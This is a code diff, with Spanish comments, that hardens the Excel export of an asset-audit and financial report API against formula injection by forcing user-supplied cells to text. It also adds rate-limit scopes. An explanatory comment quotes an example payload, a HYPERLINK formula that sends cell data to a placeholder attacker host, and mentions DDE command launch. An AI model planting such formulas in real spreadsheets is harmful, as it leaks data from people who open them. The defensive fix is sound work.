@@ -49,6 +49,36 @@ _ENCABEZADO_FONT = Font(bold=True, color='FFFFFF')
 _CENTRADO = Alignment(horizontal='center', vertical='center')
 
 
+# openpyxl liga como FORMULA cualquier string que empiece con '=' (le pone
+# data_type 'f' y lo escribe dentro de un <f> en el XML). El nombre, la serie,
+# la factura y los nombres de catalogo son texto libre de usuarios autenticados
+# —los serializers solo les ponen max_length—, asi que un activo llamado
+# '=HYPERLINK("https://evil.tld/?d="&A4,"x")' se convierte en formula viva en la
+# maquina de quien abra el reporte (contabilidad, un auditor externo): filtra
+# datos por HYPERLINK/WEBSERVICE, lanza comandos por DDE o corrompe justo las
+# cifras que el documento existe para dar fe. Ningun reporte de este modulo
+# escribe formulas a proposito, asi que forzar el tipo texto no pierde nada.
+_TIPO_TEXTO = 's'
+
+
+def _neutralizar_celda(celda):
+    """Fuerza a texto una celda cuyo valor sea string, para que no quede ligada
+    como formula. Se aplica al valor ya escrito, asi que no lo altera: el
+    usuario ve el texto literal, no un apostrofo agregado."""
+    if isinstance(celda.value, str):
+        celda.data_type = _TIPO_TEXTO
+    return celda
+
+
+def _escribir_fila(ws, valores):
+    """append() + neutralizacion. Toda escritura de fila de datos pasa por aqui
+    para que las dos rutas de exportacion (auditoria y financiero) no puedan
+    divergir: arreglar una y olvidar la otra deja el agujero abierto."""
+    ws.append(valores)
+    for celda in ws[ws.max_row]:
+        _neutralizar_celda(celda)
+
+
 def _nombre_hoja(nombre, usados):
     """Nombre de hoja valido para Excel: sin caracteres prohibidos, <= 31 chars
     y unico dentro del libro (desambigua con un sufijo si ya se uso)."""
@@ -114,7 +144,9 @@ def construir_libro(anio):
 
     for categoria, items in grupos.items():
         ws = wb.create_sheet(title=_nombre_hoja(categoria, usados))
+        # El nombre de la categoria tambien es texto de usuario (catalogo).
         ws['A1'] = categoria
+        _neutralizar_celda(ws['A1'])
         ws['A1'].font = Font(bold=True, size=14)
         ws.append([])  # fila 2 en blanco
         ws.append(COLUMNAS)  # fila 3: encabezados
@@ -123,7 +155,7 @@ def construir_libro(anio):
             celda.fill = _ENCABEZADO_FILL
             celda.alignment = _CENTRADO
         for activo in items:
-            ws.append(_fila(activo, corte))
+            _escribir_fila(ws, _fila(activo, corte))
         _dar_formato(ws)
 
     if not wb.worksheets:
@@ -166,6 +198,11 @@ def _dar_formato(ws):
 
 class ReporteAuditoriaView(APIView):
     """GET /api/reportes/auditoria/?anio=<YYYY> — descarga el .xlsx de auditoria."""
+
+    # Armar el libro recorre todos los activos vigentes al corte: 3/min por
+    # usuario y empresa frena el spam sin estorbar a quien lo descarga un par
+    # de veces mientras revisa. Balde propio, separado del financiero.
+    throttle_scope = 'reporte_auditoria'
 
     def get(self, request):
         anio = _validar_anio(request.query_params.get('anio'))
@@ -328,7 +365,7 @@ def construir_libro_financiero(corte, empresa_nombre):
               align=_AL_CEN, borde=None):
         """Fusiona la fila de la columna 1 a `hasta_col` y le pone el texto."""
         ws.merge_cells(start_row=fila, start_column=1, end_row=fila, end_column=hasta_col)
-        celda = ws.cell(row=fila, column=1, value=texto)
+        celda = _neutralizar_celda(ws.cell(row=fila, column=1, value=texto))
         celda.font = font
         celda.alignment = align
         for col in range(1, hasta_col + 1):
@@ -381,7 +418,7 @@ def construir_libro_financiero(corte, empresa_nombre):
     for g in grupos.values():
         r += 1
         ws.merge_cells(start_row=r, start_column=1, end_row=r, end_column=2)
-        etiqueta = ws.cell(row=r, column=1, value=_cat_label(g['cat']))
+        etiqueta = _neutralizar_celda(ws.cell(row=r, column=1, value=_cat_label(g['cat'])))
         etiqueta.font = _F_DATO_RESUMEN
         etiqueta.alignment = _AL_IZQ
         cant = ws.cell(row=r, column=3, value=len(g['filas']))
@@ -423,7 +460,7 @@ def construir_libro_financiero(corte, empresa_nombre):
         for datos in g['filas']:
             r += 1
             for col, valor in enumerate(datos, start=1):
-                celda = ws.cell(row=r, column=col, value=valor)
+                celda = _neutralizar_celda(ws.cell(row=r, column=col, value=valor))
                 celda.font = _F_DATO
                 if col in _DET_FECHA:
                     celda.number_format = _FMT_FECHA_REF
@@ -481,6 +518,8 @@ def construir_libro_financiero(corte, empresa_nombre):
 class ReporteFinancieroView(APIView):
     """GET /api/reportes/financiero/?corte=<YYYY-MM> — descarga el .xlsx del
     reporte financiero al ultimo dia del mes solicitado."""
+
+    throttle_scope = 'reporte_financiero'
 
     def get(self, request):
         corte = _validar_corte(request.query_params.get('corte'))
